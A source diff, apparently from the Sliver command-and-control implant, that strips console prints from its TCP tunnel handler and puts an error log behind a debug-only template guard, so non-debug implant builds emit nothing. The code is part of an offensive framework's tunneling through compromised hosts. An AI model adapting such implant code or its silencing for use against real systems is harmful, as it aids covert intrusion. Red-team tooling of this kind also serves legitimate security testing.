@@ -235,12 +235,9 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 }
 
 func tcpTunnelReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
-	fmt.Println("A call to tcpTunnelReqHandler()")
-
 	returnStatusCode := func(statusCode byte, connection *transports.Connection) {
 		// {{if .Debug}}
 		log.Printf("Returning status code for tcptunnel %d\n", statusCode)
-		log.Printf("Connection object %s\n", connection)
 		// {{end}}
 		tcpTunnelResp, _ := proto.Marshal(&sliverpb.TCPTunnel{
 			StatusCode: uint32(statusCode),
@@ -302,13 +299,14 @@ func tcpTunnelReqHandler(envelope *sliverpb.Envelope, connection *transports.Con
 			}
 
 			if err != nil && err != io.ErrShortWrite {
-				fmt.Printf("Closing tunnel because of error %s\n", err.Error())
+				// {{if .Debug}}
+				log.Printf("Closing tunnel because of error %s\n", err.Error())
+				// {{end}}
 				break
 			}
 		}
 
 		// Cleanup
-		fmt.Println("Closing tunnel")
 		connection.RemoveTunnel(tunnel.ID)
 		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
 			Closed:   true,
@@ -319,6 +317,5 @@ func tcpTunnelReqHandler(envelope *sliverpb.Envelope, connection *transports.Con
 			Data: tunnelClose,
 		}
 		remoteConn.Close()
-		fmt.Println("Tunnel closed")
 	}()
 }
